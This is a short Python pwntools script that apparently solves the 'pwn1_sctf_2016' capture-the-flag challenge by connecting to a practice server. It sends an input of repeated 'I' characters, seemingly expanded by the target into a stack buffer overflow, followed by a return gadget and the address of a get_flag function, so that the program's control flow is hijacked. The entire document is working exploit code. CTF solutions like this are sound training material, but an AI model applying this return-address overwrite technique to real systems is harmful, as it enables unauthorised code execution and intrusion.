from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

ret = 0x804932c
get_flag = 0x8048f0d

conn = remote('node4.buuoj.cn', 25821 )
#conn = process('./pwn1_sctf_2016')

payload = b'I' * 20
payload += p32(ret)
payload += p32(get_flag)
conn.sendline(payload)

conn.recv()
#conn.interactive()


